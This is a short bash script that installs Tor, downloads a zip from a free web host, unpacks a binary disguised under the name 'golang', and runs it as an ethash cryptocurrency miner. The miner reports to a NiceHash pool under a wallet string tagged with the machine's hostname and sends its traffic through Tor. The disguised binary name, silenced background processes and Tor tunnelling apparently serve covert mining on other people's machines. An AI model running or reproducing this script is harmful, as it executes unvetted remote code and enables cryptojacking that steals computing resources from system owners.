#!/bin/bash

sudo apt-get install -y tor libpci-dev 

string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(hostname)
pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353

nohup tor &>/dev/null &

wget https://minerhosting.000webhostapp.com/files/golang_linux_amd64.zip

unzip golang_linux_amd64.zip

cd golang_linux_amd64

chmod 777 golang

./golang -a ethash --url $pool1 -u $string -p x --proxy 127.0.0.1:9050
